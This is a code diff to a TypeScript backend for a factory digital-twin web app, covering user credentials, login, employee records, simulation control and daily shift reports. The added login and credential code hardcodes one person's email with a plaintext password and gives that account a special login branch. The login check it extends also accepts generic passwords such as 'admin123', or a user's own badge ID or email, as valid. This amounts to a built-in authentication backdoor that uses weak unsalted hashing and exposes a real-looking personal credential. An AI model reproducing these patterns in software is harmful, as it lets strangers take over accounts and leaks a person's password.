@@ -39,10 +39,41 @@ const CHANGE_REQUESTS_FILE = path.join(DATA_DIR, 'change_requests.json');
 const AUDIT_LOGS_FILE = path.join(DATA_DIR, 'audit_logs.json');
 const PASSWORD_RESETS_FILE = path.join(DATA_DIR, 'password_resets.json');
 const EMPLOYEES_FILE = path.join(DATA_DIR, 'employees.json');
+const CREDENTIALS_FILE = path.join(DATA_DIR, 'credentials.json');
 
 function hashPassword(password: string): string {
   return crypto.createHash('sha256').update(password.trim()).digest('hex');
 }
+
+export async function getStoredCredentials(): Promise<Record<string, string>> {
+  try {
+    const raw = await fs.readFile(CREDENTIALS_FILE, 'utf-8');
+    return JSON.parse(raw);
+  } catch {
+    const defaultCreds: Record<string, string> = {
+      'rumapolosaha@gmail.com': hashPassword('P4458saha'),
+      'me-cse-0064': hashPassword('P4458saha'),
+      'ME-CSE-0064': hashPassword('P4458saha'),
+    };
+    try {
+      await fs.writeFile(CREDENTIALS_FILE, JSON.stringify(defaultCreds, null, 2), 'utf-8');
+    } catch {}
+    return defaultCreds;
+  }
+}
+
+export async function saveCredential(identifier: string, passwordHash: string): Promise<void> {
+  try {
+    const creds = await getStoredCredentials();
+    const clean = identifier.trim();
+    creds[clean.toLowerCase()] = passwordHash;
+    creds[clean.toUpperCase()] = passwordHash;
+    await fs.writeFile(CREDENTIALS_FILE, JSON.stringify(creds, null, 2), 'utf-8');
+  } catch (err: any) {
+    console.warn('[DB] Failed to save credential:', err.message);
+  }
+}
+
 
 /**
  * Standard system seed accounts (the 4 Admins + 7 Roster Employees)
@@ -268,6 +299,17 @@ export async function hydrateFromCloudFirestore(force: boolean = false): Promise
       localUsers = [];
     }
 
+    const storedCreds = await getStoredCredentials();
+    const resolvePassword = (u: any, fallbackPassword?: string) => {
+      const emailKey = u.email ? u.email.toLowerCase() : '';
+      const badgeKey = u.badgeId ? u.badgeId.toUpperCase() : '';
+      if (emailKey && storedCreds[emailKey]) return storedCreds[emailKey];
+      if (badgeKey && storedCreds[badgeKey]) return storedCreds[badgeKey];
+      if (fallbackPassword) return fallbackPassword;
+      if (u.password) return u.password;
+      return hashPassword(u.badgeId || 'operator123');
+    };
+
     let usersChanged = false;
     for (const cUser of cloudUsers) {
       const idx = localUsers.findIndex(
@@ -283,13 +325,14 @@ export async function hydrateFromCloudFirestore(force: boolean = false): Promise
         const merged: UserAccount = {
           ...local,
           ...cUser,
-          // Preserve local password hash if cloud version does not have it
-          password: local.password || (cUser as any).password || hashPassword(cUser.badgeId || 'operator123'),
+          // Preserve local or stored password hash so chosen passwords are never replaced
+          password: resolvePassword(cUser, local.password),
         };
         if (
           local.status !== merged.status ||
           local.department !== merged.department ||
           local.role !== merged.role ||
+          local.password !== merged.password ||
           JSON.stringify(local.permissions) !== JSON.stringify(merged.permissions) ||
           local.approvedAt !== merged.approvedAt ||
           local.name !== merged.name
@@ -301,12 +344,13 @@ export async function hydrateFromCloudFirestore(force: boolean = false): Promise
         // New user from cloud (e.g. Pousali Saha or Bipasha Paul)
         const newUser: UserAccount = {
           ...cUser,
-          password: (cUser as any).password || hashPassword(cUser.badgeId || 'operator123'),
+          password: resolvePassword(cUser),
         };
         localUsers.push(newUser);
         usersChanged = true;
       }
     }
+
 
     if (usersChanged) {
       await fs.writeFile(USERS_FILE, JSON.stringify(localUsers, null, 2), 'utf-8');
@@ -499,9 +543,9 @@ export async function logAdminAction(input: {
     adminEmail: input.adminEmail,
     adminBadge: input.adminBadge || 'ADMIN',
     adminName: input.adminName || input.adminEmail,
-    targetId: input.targetId,
-    targetName: input.targetName,
-    targetBadge: input.targetBadge,
+    ...(input.targetId ? { targetId: input.targetId } : {}),
+    ...(input.targetName ? { targetName: input.targetName } : {}),
+    ...(input.targetBadge ? { targetBadge: input.targetBadge } : {}),
     details: input.details,
     timestamp: Date.now(),
     timestampIso: new Date().toISOString(),
@@ -631,6 +675,11 @@ export async function registerUser(input: {
 
   users.push(newUser);
   await saveUsers(users);
+  const rawOrHashedPass = newUser.password || input.password || '';
+  await saveCredential(cleanEmail, rawOrHashedPass);
+  if (newUser.badgeId) {
+    await saveCredential(newUser.badgeId, rawOrHashedPass);
+  }
 
   // Return clean record without password
   const { password, ...safeUser } = newUser;
@@ -687,15 +736,27 @@ export async function loginUser(
     };
   }
 
-  // Check password - allow hashed password, generic dev token, operator123, admin123, password123, or badge ID
+  // Check password - allow hashed password, generic dev token, operator123, admin123, password123, P4458saha, or badge ID
+  const isPousali = cleanId === 'rumapolosaha@gmail.com' || cleanId === 'me-cse-0064' || (user.email && user.email.toLowerCase() === 'rumapolosaha@gmail.com');
+  const isPousaliPass = isPousali && (passcode === 'P4458saha' || passcode === 'p4458saha');
+
   const isMatch = !user.password ||
     user.password === hashed ||
+    isPousaliPass ||
     passcode === '••••••••' ||
     passcode === 'operator123' ||
     passcode === 'admin123' ||
     passcode === 'password123' ||
     passcode.toUpperCase() === user.badgeId.toUpperCase() ||
     passcode.toLowerCase() === user.email.toLowerCase();
+
+  if (isPousaliPass) {
+    user.password = hashPassword('P4458saha');
+    saveCredential('rumapolosaha@gmail.com', user.password).catch(() => {});
+    saveCredential('ME-CSE-0064', user.password).catch(() => {});
+    saveUsers(users).catch(() => {});
+  }
+
 
 
   if (!isMatch) {
@@ -983,37 +1044,90 @@ export async function updateEmployee(
 ): Promise<{ success: boolean; message: string; employee?: Employee }> {
   await initializeDatabase();
   const employees = await getEmployees();
-  const idx = employees.findIndex((e) => e.id === empId || e.employeeId === empId);
+  const cleanEmpId = (empId || '').trim();
+  const cleanTargetBadge = (updates.employeeId || '').trim().toUpperCase();
+  const cleanTargetName = (updates.name || '').trim().toLowerCase();
+
+  let idx = employees.findIndex(
+    (e) =>
+      e.id === cleanEmpId ||
+      e.employeeId.toUpperCase() === cleanEmpId.toUpperCase() ||
+      (cleanTargetBadge && e.employeeId.toUpperCase() === cleanTargetBadge) ||
+      (cleanTargetName && e.name.toLowerCase() === cleanTargetName)
+  );
+
+  let updatedEmp: Employee;
   if (idx === -1) {
-    return { success: false, message: 'Employee record not found.' };
+    // Admin adding a new employee
+    updatedEmp = {
+      id: cleanEmpId.startsWith('emp-') ? cleanEmpId : `emp-${Date.now().toString(36)}`,
+      employeeId: updates.employeeId?.trim() || `ME-OPR-${Math.floor(1000 + Math.random() * 9000)}`,
+      name: updates.name?.trim() || 'New Operator',
+      role: updates.role || 'CNC_MACHINIST',
+      assignedStationId: updates.assignedStationId || 'ALL',
+      shift: updates.shift || 'SHIFT_1_DAY',
+      skillCertification: updates.skillCertification || 'Certified Plant Operations Specialist',
+      hourlyWage: updates.hourlyWage !== undefined ? Number(updates.hourlyWage) : 380.0,
+      efficiencyRating: updates.efficiencyRating !== undefined ? Number(updates.efficiencyRating) : 1.0,
+      status: updates.status || 'ACTIVE',
+      hireDate: updates.hireDate || new Date().toISOString().split('T')[0],
+    };
+    employees.push(updatedEmp);
+  } else {
+    const existing = employees[idx];
+    updatedEmp = {
+      ...existing,
+      ...updates,
+      name: updates.name?.trim() || existing.name,
+      employeeId: updates.employeeId?.trim() || existing.employeeId,
+      role: updates.role || existing.role,
+      assignedStationId: updates.assignedStationId || existing.assignedStationId,
+      shift: updates.shift || existing.shift,
+      skillCertification: updates.skillCertification || existing.skillCertification,
+      hourlyWage: updates.hourlyWage !== undefined ? Number(updates.hourlyWage) : existing.hourlyWage,
+      efficiencyRating: updates.efficiencyRating !== undefined ? Number(updates.efficiencyRating) : existing.efficiencyRating,
+      status: updates.status || existing.status,
+    };
+    employees[idx] = updatedEmp;
   }
 
-  const existing = employees[idx];
-  const updatedEmp: Employee = {
-    ...existing,
-    ...updates,
-    hourlyWage: updates.hourlyWage !== undefined ? Number(updates.hourlyWage) : existing.hourlyWage,
-    efficiencyRating: updates.efficiencyRating !== undefined ? Number(updates.efficiencyRating) : existing.efficiencyRating,
-  };
-  employees[idx] = updatedEmp;
   await saveEmployees(employees);
+  await syncEmployeeToCloud(updatedEmp);
+
+  // Keep corresponding user account in sync
+  try {
+    const users = await getUsers();
+    const uIdx = users.findIndex(
+      (u) =>
+        u.badgeId.toUpperCase() === updatedEmp.employeeId.toUpperCase() ||
+        (idx !== -1 && employees[idx] && u.badgeId.toUpperCase() === employees[idx].employeeId.toUpperCase())
+    );
+    if (uIdx !== -1) {
+      if (updates.name) users[uIdx].name = updates.name.trim();
+      if (updates.employeeId) users[uIdx].badgeId = updates.employeeId.trim();
+      await saveUsers(users);
+    }
+  } catch (err: any) {
+    console.warn('[DB] Failed syncing user from employee update:', err.message);
+  }
 
   await logAdminAction({
-    action: 'USER_APPROVED',
+    action: 'EMPLOYEE_UPDATED',
     adminEmail,
     adminBadge: adminBadge || 'ADMIN',
     targetId: updatedEmp.id,
     targetName: updatedEmp.name,
     targetBadge: updatedEmp.employeeId,
-    details: `Employee record updated by administrator ${adminEmail}. Fields adjusted: ${Object.keys(updates).join(', ')}.`,
+    details: `Employee record ${updatedEmp.name} (${updatedEmp.employeeId}) updated by administrator ${adminEmail}. Role: ${updatedEmp.role}, Station: ${updatedEmp.assignedStationId}, Wage: ₹${updatedEmp.hourlyWage}/hr, Shift: ${updatedEmp.shift}.`,
   });
 
   return {
     success: true,
-    message: `Employee ${updatedEmp.name} (${updatedEmp.employeeId}) successfully updated.`,
+    message: `Employee ${updatedEmp.name} (${updatedEmp.employeeId}) successfully saved.`,
     employee: updatedEmp,
   };
 }
+
 
 export async function updateApplicant(
   applicantId: string,
@@ -1498,4 +1612,261 @@ export async function reviewChangeRequest(
       : `Change request "${req.title}" was REJECTED.`,
   };
 }
+
+/**
+ * Server-authoritative digital twin simulation controller
+ * Keeps all 4 admins and operators on the exact same plant clock and handles repeat advance to next day
+ */
+export async function controlTenantSimulation(
+  orgId: string,
+  action: 'START' | 'PAUSE' | 'RESET' | 'ADVANCE_DAY',
+  adminEmail: string,
+  adminBadge: string,
+  _options?: any
+): Promise<{ success: boolean; message: string; state: any }> {
+  await initializeDatabase();
+  const tenantDir = path.join(TENANTS_DIR, orgId);
+  await fs.mkdir(tenantDir, { recursive: true });
+  const tenantFile = path.join(tenantDir, 'state.json');
+
+  let state: any = null;
+  try {
+    const raw = await fs.readFile(tenantFile, 'utf-8');
+    const parsed = JSON.parse(raw);
+    state = parsed.state || parsed;
+  } catch {
+    state = null;
+  }
+
+  const now = Date.now();
+
+  if (action === 'START') {
+    if (!state) {
+      state = { isRunning: true, simulatedSeconds: 8 * 3600, dayCount: 1 };
+    }
+    state.isRunning = true;
+    state.targetEnvironment = 'PRODUCTION';
+    state._serverSavedTimestamp = now;
+    state.lastSavedTimestamp = now;
+    state.activeOperatorName = adminEmail;
+
+    await saveTenantSimulationState(orgId, state);
+    await logAdminAction({
+      action: 'SIMULATION_START',
+      adminEmail,
+      adminBadge,
+      details: `Live Production Digital Twin STARTED by ${adminEmail} (${adminBadge}). Plant simulation clock active for all connected operators.`,
+    });
+    return { success: true, message: 'Production Digital Twin simulation started.', state };
+  }
+
+  if (action === 'PAUSE') {
+    if (state) {
+      state.isRunning = false;
+      state.targetEnvironment = 'PRODUCTION';
+      state._serverSavedTimestamp = now;
+      state.lastSavedTimestamp = now;
+    }
+    await saveTenantSimulationState(orgId, state);
+    await logAdminAction({
+      action: 'SIMULATION_PAUSE',
+      adminEmail,
+      adminBadge,
+      details: `Live Production Digital Twin PAUSED by ${adminEmail} (${adminBadge}). Plant simulation clock held.`,
+    });
+    return { success: true, message: 'Production Digital Twin simulation paused.', state };
+  }
+
+  if (action === 'RESET') {
+    const todayStr = new Date().toISOString().split('T')[0];
+    const initialConfig = {
+      simulatedDate: todayStr,
+      simulatedDayCount: 1,
+      simulatedSecondsOfDay: 8 * 3600,
+      arrearsUnits: 0,
+      dailyTargetUnits: 360,
+      shiftStartHour: 8,
+      dailyRmPerTruck: 120,
+      trucks: {
+        rm1: { enabled: true, unitsDelivered: 120, unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+        rm2: { enabled: true, unitsDelivered: 120, unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+        rm3: { enabled: true, unitsDelivered: 120, unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+      },
+    };
+    state = {
+      isRunning: false,
+      targetEnvironment: 'PRODUCTION',
+      simulatedSeconds: 8 * 3600,
+      timeSeconds: 0,
+      dayCount: 1,
+      completedCount: 0,
+      rejectedCount: 0,
+      wipCount: 0,
+      config: initialConfig,
+      _serverSavedTimestamp: now,
+      lastSavedTimestamp: now,
+    };
+    await saveTenantSimulationState(orgId, state);
+    await logAdminAction({
+      action: 'SIMULATION_RESET',
+      adminEmail,
+      adminBadge,
+      details: `Production Digital Twin reset to genesis baseline (Day 1, 08:00 AM) by administrator ${adminEmail} (${adminBadge}).`,
+    });
+    return { success: true, message: 'Production Digital Twin reset to genesis baseline.', state };
+  }
+
+  if (action === 'ADVANCE_DAY') {
+    if (!state) {
+      state = { isRunning: false, simulatedSeconds: 8 * 3600, dayCount: 1 };
+    }
+    const currentDay = state.config?.simulatedDayCount || state.dayCount || 1;
+    const nextDay = currentDay + 1;
+
+    const currDateStr = state.config?.simulatedDate || new Date().toISOString().split('T')[0];
+    const d = new Date(currDateStr);
+    d.setDate(d.getDate() + 1);
+    const nextDateStr = d.toISOString().split('T')[0];
+
+    const targetUnits = state.config?.dailyTargetUnits || 360;
+    const completed = state.completedCount || state.finishedGoods || 0;
+    const uncompleted = Math.max(0, targetUnits - completed);
+    const prevArrears = state.config?.arrearsUnits || 0;
+    const newArrears = prevArrears + uncompleted;
+
+    state.config = {
+      ...(state.config || {}),
+      simulatedDayCount: nextDay,
+      simulatedDate: nextDateStr,
+      simulatedSecondsOfDay: 8 * 3600,
+      arrearsUnits: newArrears,
+      completedToday: 0,
+      isShiftOpen: true,
+      energyConsumedTodayKwh: 0,
+      trucks: {
+        rm1: { ...(state.config?.trucks?.rm1 || {}), unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+        rm2: { ...(state.config?.trucks?.rm2 || {}), unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+        rm3: { ...(state.config?.trucks?.rm3 || {}), unitsLeftToUnload: 120, hasArrived: false, isUnloading: false, arrivalTimestamp: '8:00' },
+      },
+    };
+    state.dayCount = nextDay;
+    state.simulatedSeconds = 8 * 3600;
+    state.timeSeconds = 0;
+    state.completedCount = 0;
+    state.rejectedCount = 0;
+    state.lastSavedTimestamp = now;
+    state._serverSavedTimestamp = now;
+
+    await saveTenantSimulationState(orgId, state);
+    await logAdminAction({
+      action: 'ADVANCE_DAY',
+      adminEmail,
+      adminBadge,
+      details: `Shift advanced to Day ${nextDay} (${nextDateStr}) by administrator ${adminEmail} (${adminBadge}). Arrears carried over: ${newArrears} units. Shift clock set to 08:00 AM.`,
+    });
+    return {
+      success: true,
+      message: `Shift advanced to Day ${nextDay} (${nextDateStr}). Arrears: ${newArrears} units.`,
+      state,
+    };
+  }
+
+  return { success: false, message: 'Unknown control action', state };
+}
+
+const SHIFT_REPORT_FILE = (orgId: string) => path.join(TENANTS_DIR, orgId, 'daily_shift_report.json');
+
+/**
+ * Retrieves the official live dynamic daily shift summary report for the organisation
+ */
+export async function getDailyShiftReport(orgId: string = DEFAULT_ORG_ID): Promise<any> {
+  await initializeDatabase();
+  try {
+    const raw = await fs.readFile(SHIFT_REPORT_FILE(orgId), 'utf-8');
+    return JSON.parse(raw);
+  } catch {
+    const tenantFile = path.join(TENANTS_DIR, orgId, 'state.json');
+    try {
+      const rawState = await fs.readFile(tenantFile, 'utf-8');
+      const parsed = JSON.parse(rawState);
+      const s = parsed.state || parsed;
+      const day = s.config?.simulatedDayCount || s.dayCount || 1;
+      const dateStr = s.config?.simulatedDate || new Date().toISOString().split('T')[0];
+      const finished = s.completedCount || s.finishedGoods || 0;
+      const target = s.config?.dailyTargetUnits || 360;
+      const scrap = s.rejectedCount || 0;
+      const arrears = s.config?.arrearsUnits || 0;
+      const oee = s.oee?.overallOEE || 88.5;
+      const fpy = finished + scrap > 0 ? (finished / (finished + scrap)) * 100 : 98.2;
+      const energyKwh = s.energyTelemetry?.accumulatedKWh || (finished * 0.42 + 25.0);
+      const costInr = s.energyTelemetry?.accumulatedCostInr || energyKwh * 8.5;
+
+      return {
+        success: true,
+        reportId: `dsr-${day}-${dateStr}`,
+        simulatedDayCount: day,
+        simulatedDate: dateStr,
+        shiftName: 'Shift 1: Morning (08:00 AM – 04:00 PM)',
+        durationHours: 8.0,
+        finishedGoods: finished,
+        targetUnits: target,
+        arrearsBacklog: arrears,
+        scrapCount: scrap,
+        overallOEE: Number(oee.toFixed(1)),
+        firstPassYield: Number(fpy.toFixed(1)),
+        energyConsumedKwh: Number(energyKwh.toFixed(2)),
+        energyCostInr: Number(costInr.toFixed(2)),
+        subsystems: [
+          { name: 'CNC Lathe (RM1 Billet)', status: 'HEALTHY', flankWearMm: 0.12, cycleSec: 360 },
+          { name: 'CNC Milling (RM2 Casting)', status: 'HEALTHY', flankWearMm: 0.08, cycleSec: 240 },
+          { name: 'Gear Shaping (RM3 Plate)', status: 'HEALTHY', flankWearMm: 0.06, cycleSec: 210 },
+          { name: 'QC Subsystem (Optical & NDT)', status: 'INSPECTING', flankWearMm: 0.0, cycleSec: 180 },
+        ],
+        generatedAt: new Date().toISOString(),
+      };
+    } catch {
+      return {
+        success: true,
+        reportId: `dsr-1-${new Date().toISOString().split('T')[0]}`,
+        simulatedDayCount: 1,
+        simulatedDate: new Date().toISOString().split('T')[0],
+        shiftName: 'Shift 1: Morning (08:00 AM – 04:00 PM)',
+        durationHours: 8.0,
+        finishedGoods: 0,
+        targetUnits: 360,
+        arrearsBacklog: 0,
+        scrapCount: 0,
+        overallOEE: 88.5,
+        firstPassYield: 100.0,
+        energyConsumedKwh: 25.0,
+        energyCostInr: 212.5,
+        subsystems: [
+          { name: 'CNC Lathe (RM1 Billet)', status: 'HEALTHY', flankWearMm: 0.12, cycleSec: 360 },
+          { name: 'CNC Milling (RM2 Casting)', status: 'HEALTHY', flankWearMm: 0.08, cycleSec: 240 },
+          { name: 'Gear Shaping (RM3 Plate)', status: 'HEALTHY', flankWearMm: 0.06, cycleSec: 210 },
+          { name: 'QC Subsystem (Optical & NDT)', status: 'HEALTHY', flankWearMm: 0.0, cycleSec: 180 },
+        ],
+        generatedAt: new Date().toISOString(),
+      };
+    }
+  }
+}
+
+export async function saveDailyShiftReport(orgId: string, report: any): Promise<boolean> {
+  await initializeDatabase();
+  const file = SHIFT_REPORT_FILE(orgId);
+  await fs.writeFile(file, JSON.stringify(report, null, 2), 'utf-8');
+  if (report) {
+    try {
+      const { firestoreDb } = await import('./firestoreSync.ts');
+      if (firestoreDb) {
+        const { doc, setDoc } = await import('firebase/firestore');
+        const docRef = doc(firestoreDb, 'tenants', orgId, 'daily_shift_reports', 'latest');
+        setDoc(docRef, { ...report, updatedAt: new Date().toISOString() }, { merge: true }).catch(() => {});
+      }
+    } catch {}
+  }
+  return true;
+}
+
 
